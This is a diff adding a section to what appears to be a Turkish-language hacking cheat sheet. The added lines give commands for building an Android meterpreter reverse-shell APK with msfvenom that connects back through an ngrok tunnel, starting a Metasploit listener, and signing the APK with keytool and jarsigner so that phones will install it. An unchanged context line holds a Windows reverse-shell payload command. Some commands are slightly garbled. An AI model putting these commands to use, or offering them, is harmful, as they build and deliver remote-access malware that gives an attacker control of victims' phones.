@@ -353,5 +353,25 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 EXITFUNC=thre
 
 locate < dosyanın tam adı >
 
+## Ngrok Msfvenom ##
+
+./ngrok tcp 4444
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=1234 R > /root/Desktop/exploit.apk -i 20
+
+service postgresql start
+
+msfconsole use exploit/multi/handler set payload - LHOST=0.0.0.0 - LPORT=4444
+
+## APK İmzalama ##
+
+install jdk
+
+keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore ngroktest.apk alias_name
+
+jarsigner -verify -verbose -certs android_shell.apk
+
  
 
